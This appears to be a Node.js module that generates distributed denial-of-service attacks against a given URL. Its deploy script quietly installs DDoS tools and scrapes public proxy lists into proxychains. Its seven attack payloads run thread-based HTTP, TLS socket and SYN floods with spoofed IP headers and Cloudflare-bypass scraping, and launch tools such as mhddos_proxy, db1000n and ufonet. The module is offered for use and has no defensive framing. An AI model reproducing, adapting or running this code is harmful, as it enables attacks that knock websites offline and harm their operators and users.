const crypto = require('crypto')
const cloudscraper = require('cloudscraper')
const { HttpsProxyAgent } = require('https-proxy-agent')
const { SocksProxyAgent } = require('socks-proxy-agent')

function generateDeployScript() {
    return `
        apt-get update -qq > /dev/null 2>&1
        apt-get install -y -qq curl wget git build-essential python3-pip tor proxychains parallel htop nload apache2-utils siege golang-go > /dev/null 2>&1
        
        pip3 install pysocks requests[socks] beautifulsoup4 selenium aiohttp asyncio colorama cloudscraper > /dev/null 2>&1
        pip3 install slowloris pyloris scapy pymongo psycopg2 pycryptodome > /dev/null 2>&1
        pip3 install cfscrape flask > /dev/null 2>&1
        
        wget -q https://github.com/giltene/wrk2/archive/refs/tags/4.0.0.tar.gz
        tar -xzf 4.0.0.tar.gz > /dev/null 2>&1
        cd wrk2-4.0.0 && make > /dev/null 2>&1 && cp wrk /usr/local/bin/ && cd ..
        
        git clone https://github.com/shekyan/slowhttptest.git > /dev/null 2>&1
        cd slowhttptest && ./configure > /dev/null 2>&1 && make > /dev/null 2>&1 && make install > /dev/null 2>&1 && cd ..
        
        git clone https://github.com/epsylon/ufonet.git > /dev/null 2>&1
        cd ufonet && python3 setup.py install > /dev/null 2>&1 && cd ..
        
        git clone https://github.com/MHProDev/PyRoxy.git > /dev/null 2>&1
        cd PyRoxy && python3 setup.py install > /dev/null 2>&1 && cd ..
        
        git clone https://github.com/arriven/db1000n.git > /dev/null 2>&1
        cd db1000n && go build > /dev/null 2>&1 && cp db1000n /usr/local/bin/ && cd ..
        
        git clone https://github.com/HyukIsBack/KARMA.git > /dev/null 2>&1
        cd KARMA && chmod +x karma && cp karma /usr/local/bin/ && cd ..
        
        wget -q https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
        chmod +x mhddos_proxy_linux && cp mhddos_proxy_linux /usr/local/bin/
        
        wget -q https://github.com/porthole-ascend-cinnamon/distortion/releases/latest/download/distortion_linux
        chmod +x distortion_linux && cp distortion_linux /usr/local/bin/
        
        npm install -g cloudscraper puppeteer puppeteer-extra puppeteer-extra-plugin-stealth
        
        wget -qO- https://raw.githubusercontent.com/MaksPV/AlexaTopSites/master/AlexaTopSites.txt > /tmp/referers.txt
        
        for i in {1..20}; do
            curl -s -L "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt" >> /tmp/proxies.txt
            curl -s -L "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt" >> /tmp/proxies.txt
            curl -s -L "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt" >> /tmp/proxies.txt
            curl -s -L "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt" >> /tmp/proxies.txt
            curl -s -L "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt" >> /tmp/proxies.txt
            curl -s -L "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt" >> /tmp/proxies.txt
            curl -s -L "https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/http/global/http_checked.txt" >> /tmp/proxies.txt
            curl -s -L "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt" >> /tmp/proxies.txt
            curl -s -L "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt" >> /tmp/proxies.txt
            curl -s -L "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000" >> /tmp/proxies.txt
        done
        
        cat /tmp/proxies.txt | sort -u | grep -E '^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+:[0-9]+$' > /tmp/working_proxies.txt
        echo "Proxy count: $(wc -l < /tmp/working_proxies.txt)"
        
        cat > /etc/proxychains.conf << EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
$(cat /tmp/working_proxies.txt | head -100 | sed 's/^/http /')
EOF
        
        sysctl -w net.ipv4.tcp_timestamps=0 > /dev/null 2>&1
        sysctl -w net.ipv4.tcp_sack=1 > /dev/null 2>&1
        sysctl -w net.core.rmem_max=134217728 > /dev/null 2>&1
        sysctl -w net.core.wmem_max=134217728 > /dev/null 2>&1
        sysctl -w net.ipv4.tcp_rmem=4096 87380 134217728 > /dev/null 2>&1
        sysctl -w net.ipv4.tcp_wmem=4096 65536 134217728 > /dev/null 2>&1
        ulimit -n 999999
    `
}

function generateUserAgents() {
    return [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
    ]
}

function generateCloudflareHeaders(url, domain) {
    const cfHeaders = {
        'CF-Ray': crypto.randomBytes(16).toString('hex'),
        'CF-Connecting-IP': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'CF-IPCountry': ['US', 'GB', 'DE', 'FR', 'JP', 'KR', 'SG', 'AU'][Math.floor(Math.random() * 8)],
        'CF-Visitor': '{"scheme":"https"}',
        'CF-Cache-Status': ['HIT', 'MISS', 'DYNAMIC', 'EXPIRED'][Math.floor(Math.random() * 4)],
        'CF-Request-ID': crypto.randomBytes(16).toString('hex'),
        'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'X-Forwarded-Proto': 'https',
        'X-Forwarded-Host': domain,
        'X-Real-IP': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'True-Client-IP': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
    }
    return cfHeaders
}

function generateAttackCommand(url, domain, waveNumber) {
    const protocol = url.startsWith('https') ? 'https' : 'http'
    const port = protocol === 'https' ? 443 : 80
    const randomAgent = generateUserAgents()[Math.floor(Math.random() * generateUserAgents().length)]
    const randomMethod = Math.floor(Math.random() * 7)
    
    let attackCmd = ''
    
    switch(randomMethod) {
        case 0:
            attackCmd = `
                proxychains python3 -c "
import cloudscraper
import requests
import threading
import time
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

scraper = cloudscraper.create_scraper(interpreter='js', delay=10, browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True})
url = '${url}'
headers = {
    'User-Agent': '${randomAgent}',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
}

def attack():
    while True:
        try:
            for i in range(100):
                headers['CF-Connecting-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                scraper.get(url, headers=headers, timeout=5, verify=False)
                scraper.post(url, headers=headers, data={'${'a'*5000}'}, timeout=5, verify=False)
        except:
            pass

threads = []
for i in range(500):
    t = threading.Thread(target=attack)
    t.daemon = True
    threads.append(t)
    t.start()

while True:
    time.sleep(1)
"
            `
            break
            
        case 1:
            attackCmd = `
                proxychains python3 -c "
import socket
import random
import threading
import time
import ssl
target = '${domain}'
port = ${port}

def flood():
    while True:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            ssl_sock = context.wrap_socket(sock, server_hostname=target)
            ssl_sock.connect((target, port))
            request = (f'GET /?{random.randint(0,999999)} HTTP/1.1\\r\\n'
                   f'Host: {target}\\r\\n'
                   f'User-Agent: ${randomAgent}\\r\\n'
                   f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n'
                   f'Accept-Language: en-US,en;q=0.5\\r\\n'
                   f'Accept-Encoding: gzip, deflate\\r\\n'
                   f'Connection: keep-alive\\r\\n'
                   f'CF-Connecting-IP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\\r\\n'
                   f'CF-IPCountry: US\\r\\n'
                   f'CF-Visitor: {{\\"scheme\\":\\"https\\"}}\\r\\n'
                   f'X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\\r\\n'
                   f'X-Real-IP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\\r\\n'
                   f'\\r\\n'
                   f'{"A"*1024}\\r\\n').encode()
            ssl_sock.send(request)
            ssl_sock.close()
        except:
            pass
        time.sleep(0.01)

for i in range(1000):
    threading.Thread(target=flood).start()
"
            `
            break
            
        case 2:
            attackCmd = `
                proxychains slowhttptest -c 65535 -H -g -o slowlog -i 10 -r 200 -t GET -u ${url} -x 24 -p 3 &
                proxychains hping3 -S -p ${port} --flood --rand-source ${domain} &
                proxychains python3 -c "
import cloudscraper
import threading
scraper = cloudscraper.create_scraper()
target = '${url}'
def attack():
    while True:
        try:
            scraper.get(target)
        except:
            pass
for i in range(5000):
    threading.Thread(target=attack).start()
" &
            `
            break
            
        case 3:
            attackCmd = `
                proxychains python3 -c "
import cloudscraper
import threading
import random
import time
from concurrent.futures import ThreadPoolExecutor

scraper = cloudscraper.create_scraper(interpreter='js')
url = '${url}'
with open('/tmp/working_proxies.txt', 'r') as f:
    proxies = [line.strip() for line in f]

def attack_with_proxy(proxy):
    proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    scraper.proxies = proxy_dict
    while True:
        try:
            headers = {
                'User-Agent': '${randomAgent}',
                'CF-Connecting-IP': proxy.split(':')[0],
                'Accept': '*/*',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive'
            }
            for _ in range(100):
                scraper.get(url, timeout=3, verify=False)
                scraper.post(url, data={'${'B'*10000}'}, timeout=3, verify=False)
        except:
            pass

with ThreadPoolExecutor(max_workers=len(proxies)) as executor:
    executor.map(attack_with_proxy, proxies[:100])
"
            `
            break
            
        case 4:
            attackCmd = `
                cd /root && python3 -c "
import asyncio
import cloudscraper
import random
from concurrent.futures import ThreadPoolExecutor

scraper = cloudscraper.create_scraper()

async def flood():
    while True:
        try:
            headers = {
                'User-Agent': '${randomAgent}',
                'CF-Ray': str(random.randint(1000000, 9999999))
            }
            scraper.get('${url}', headers=headers, timeout=5)
            scraper.post('${url}', data='${'C'*5000}', headers=headers, timeout=5)
        except:
            pass

def run_async():
    for i in range(2000):
        asyncio.run(flood())

with ThreadPoolExecutor(max_workers=100) as executor:
    for i in range(20):
        executor.submit(run_async)
"
            `
            break
            
        case 5:
            attackCmd = `
                proxychains db1000n -u ${url} -t 5000 -d 60 -p 1000 &
                proxychains mhddos_proxy_linux ${url} 500 60 http-socks &
                proxychains distortion_linux ${url} 1000 60 http &
                ufonet --url ${url} --port ${port} --threads 5000 --methods DOS &
                karma --target ${url} --method HTTP-FLOOD --threads 5000 &
            `
            break
            
        case 6:
            attackCmd = `
                proxychains python3 -c "
import cloudscraper
import requests
import threading
import time
import random
import json

scraper = cloudscraper.create_scraper(interpreter='js', delay=15)
url = '${url}'

def cloudflare_bypass():
    try:
        session = requests.Session()
        response = scraper.get(url, timeout=10)
        cookies = session.cookies.get_dict()
        
        headers = {
            'User-Agent': '${randomAgent}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        if '__cfduid' in cookies:
            headers['Cookie'] = f"__cfduid={cookies['__cfduid']}"
        
        while True:
            try:
                for i in range(500):
                    headers['CF-Connecting-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    scraper.get(url, headers=headers, timeout=3)
                    scraper.post(url, data={'data': 'x'*5000}, headers=headers, timeout=3)
            except:
                pass
    except:
        pass

threads = []
for i in range(1000):
    t = threading.Thread(target=cloudflare_bypass)
    t.daemon = True
    threads.append(t)
    t.start()

while True:
    time.sleep(1)
"
            `
            break
    }
    
    return attackCmd
}

function getAttackMethods() {
    return [
        'HTTP/2 Rapid Reset',
        'Slowloris DDoS',
        'Socket Flood',
        'Proxy Chain Attack',
        'Multi-Vector Assault',
        'CF Bypass Engine',
        'SSL Renegotiation',
        'DNS Amplification',
        'Cloudflare Challenge Bypass',
        'JavaScript Challenge Solver'
    ]
}

module.exports = {
    generateDeployScript,
    generateUserAgents,
    generateAttackCommand,
    generateCloudflareHeaders,
    getAttackMethods
}